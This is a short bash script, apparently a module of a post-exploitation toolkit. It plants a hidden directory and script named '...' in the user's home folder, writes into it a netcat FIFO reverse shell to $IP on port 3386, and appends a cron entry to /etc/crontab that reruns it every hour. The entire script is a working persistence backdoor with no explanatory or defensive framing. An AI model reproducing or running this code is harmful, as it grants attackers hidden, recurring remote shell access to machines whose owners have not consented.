#!/bin/bash

source "/opt/pmp/functions.sh"

PORT=3386
F="..."

command "mkdir ~/$F"
command "echo '#!/bin/bash' > ~/$F/$F"
command "echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f' > ~/$F/$F"
command "chmod +x ~/$F/$F"
command "echo '5 * * * * $USER $HOME/.../...' >> /etc/crontab"